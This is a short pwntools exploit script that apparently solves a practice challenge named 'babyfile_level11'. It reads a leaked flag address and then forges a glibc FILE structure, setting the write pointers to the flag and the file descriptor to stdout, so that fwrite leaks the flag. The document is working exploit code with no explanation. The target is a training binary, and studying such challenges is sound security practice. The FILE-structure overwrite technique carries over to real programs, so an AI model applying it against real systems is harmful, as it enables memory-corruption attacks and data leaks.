from pwn import * 

p = process('./babyfile_level11')

s = '''
b * fwrite
'''


p.recvuntil("is located at ")
flag_addr = int(p.recvline().strip(), 16)
print("Flag address @ ", hex(flag_addr))


p.sendline("open_file")
p.sendline("new_note 248")
p.sendline("write_fp")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(flag_addr)
payload += p64(0)
payload += p64(flag_addr)
payload += p64(flag_addr+0x120) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout

#gdb.attach(p, s)
#time.sleep(2)

p.sendline(payload)


p.sendline("write_file")



p.interactive()
